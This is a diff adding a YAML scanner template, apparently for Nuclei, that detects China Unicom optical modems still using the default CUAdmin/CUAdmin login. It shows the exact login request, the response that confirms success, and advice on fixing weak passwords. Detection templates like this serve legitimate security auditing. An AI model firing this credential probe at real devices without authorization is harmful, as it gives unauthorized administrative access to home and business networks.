@@ -1,0 +1,36 @@
+id: Chinaunicom-Default-Login
+info:
+  name: China Unicom Optical Modem Default Credentials
+  author:
+  - l0ne1y
+  description: |-
+    China Unicom optical modem default credentials
+    The China Unicom optical modem has default credentials CUAdmin/CUAdmin. Using these credentials makes it easy for attackers to enter the backend, causing sensitive information leakage.
+  severity: high
+  remediation: |-
+    #### Official remedy:
+    Upgrade the system to a non-vulnerable version, or download the security patch from the official website.
+    #### Temporary remedy:
+    1. It is recommended that system administrators immediately change found weak passwords to strong ones, conduct a comprehensive sweep of weak passwords across all system administrators, users and devices, and clean up any discovered weak passwords.<br />2. Weak passwords depend on management. Enterprises should formulate a strong password policy (e.g., passwords must include at least three formats among uppercase letters, lowercase letters, numbers and special characters, be no shorter than ten characters, arranged non-sequentially on the keyboard, and unrelated to corporate or personal information.<br />3. Weak passwords can be checked by aggregating all employee accounts and self-checking against strong password rules, or by brute forcing with a personalized dictionary.<br />4. Recommended strong password generator:[https://suijimimashengcheng.51240.com/](https://suijimimashengcheng.51240.com/)<br />5. Recommended password strength checker:[https://howsecureismypassword.net/](https://howsecureismypassword.net/)
+requests:
+- matchers:
+  - type: status
+    status:
+    - 302
+  - type: word
+    part: header
+    words:
+    - /menu.gch
+  matchers-condition: and
+  raw:
+  - |
+    POST /cu.html HTTP/1.1
+    Host: {{Hostname}}
+
+    frashnum=&action=login&Frm_Logintoken=1&Username={{username}}&Password={{password}}&Username=&Password=
+  attack: pitchfork
+  payloads:
+    password:
+    - CUAdmin
+    username:
+    - CUAdmin
